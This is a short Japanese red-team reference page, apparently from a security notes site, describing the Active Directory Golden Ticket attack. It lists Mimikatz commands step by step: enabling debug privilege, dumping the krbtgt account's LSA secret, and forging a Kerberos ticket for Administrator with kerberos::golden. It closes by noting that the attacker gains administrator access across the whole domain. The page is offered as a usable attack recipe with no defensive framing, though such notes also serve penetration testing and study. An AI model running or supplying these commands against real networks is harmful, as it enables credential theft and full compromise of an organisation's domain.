---
title: Golden Ticket
parent: Active Directory
grand_parent: Red Team
---

`Golden Ticket`は、ドメインコントローラ上の`krbtgt`アカウントの秘密情報を使用して、任意のユーザーとして認証を行う攻撃です。

```bash
.\mimikatz.exe
privilege::debug
lsadump::lsa /inject /name:krbtgt
kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:
```
### 攻撃の実行手順

この手順は、WindowsのActive Directory環境でGolden Ticket攻撃を実行するためのものです。**Golden Ticket**攻撃により、Kerberosチケットを偽造して管理者権限を取得することができます。

#### 1. Mimikatzの実行

最初に、Mimikatzツールを実行します。

```bash
.\mimikatz.exe
```

#### 2. 管理者権限の取得

次に、Mimikatzに管理者権限を取得させます。

```bash
privilege::debug
```

#### 3. `krbtgt`アカウントの暗号化キーの取得

`krbtgt`アカウントのLSAシークレットをダンプして、暗号化キーを取得します。

```bash
lsadump::lsa /inject /name:krbtgt
```

#### 4. Golden Ticket の作成

`krbtgt`の暗号化キーを使用して、Golden Ticketを作成します。

```bash
kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:[KRBTGT_HASH]
```

**注意:** `[KRBTGT_HASH]` は、上記の `lsadump::lsa` コマンドで取得した`krbtgt`アカウントのハッシュに置き換えてください。

この手順により、攻撃者はドメイン全体に対して管理者権限を持つことができ、偽造されたKerberosチケットであらゆるコンピュータにアクセスできるようになります。